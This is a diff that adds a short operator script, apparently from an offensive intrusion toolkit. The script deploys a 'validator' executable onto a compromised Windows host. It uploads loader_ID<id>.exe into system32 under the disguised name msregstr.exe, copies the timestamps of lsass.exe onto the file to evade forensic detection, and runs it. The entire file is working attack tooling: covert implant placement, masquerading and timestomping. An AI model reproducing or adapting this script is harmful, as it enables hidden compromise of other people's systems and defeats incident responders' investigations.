@@ -1,0 +1,76 @@
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+if ($argc > 1)
+{
+	ifnot (`script cangetout.eps $argv[1]`) 
+	{
+		echo "Cannot get out!!!  Not installing validator!!\n";
+		return false;
+	}
+}
+else
+{
+	ifnot (`script cangetout.eps`) 
+	{
+		echo "Cannot get out!!!  Not installing validator!!\n";
+		return false;
+	}
+}
+
+# get name of validator file
+string $valPath="$ScriptsDir\\..\\..\\..\\resources\\VA";
+string $spentValPath="$ScriptsDir\\..\\..\\..\\resources\\VA\\spent";
+
+string $valID=GetInput("What is the id of the validator to deploy?");
+string $valFile="$valPath\\loader_ID$valID.exe";
+
+### Get system path
+string $systemroot;
+@echo off;
+@record on;
+ifnot(`lpgetenv -option systemroot`) {
+	`script syspath.eps`;
+	ifnot(`lpgetenv -option systemroot`) {
+		echo "Could not get system root.  Exiting.";
+		return false;
+	} else {
+		$systemroot=GetCmdData("value");
+	}
+} else {
+	$systemroot=GetCmdData("value");
+}
+@echo on;
+@record off;
+
+
+# put up as msregstr.exe in system32
+string $newname="$systemroot\\system32\\msregstr.exe";
+ifnot (`put $valFile -name $newname -permanent`) {
+	echo "ERROR putting up validator!";
+	pause;
+} else {
+	# Compare checksums
+	`checksum $newname`;
+	`local checksum $valFile`;
+}
+
+# match times
+`matchtimes $systemroot\\system32\\lsass.exe $newname`;
+
+# run
+`run -command "$newname"`;
+
+# TODO: rename local
+`local run -command "move $valFile $spentValPath"`;
+
+return true;
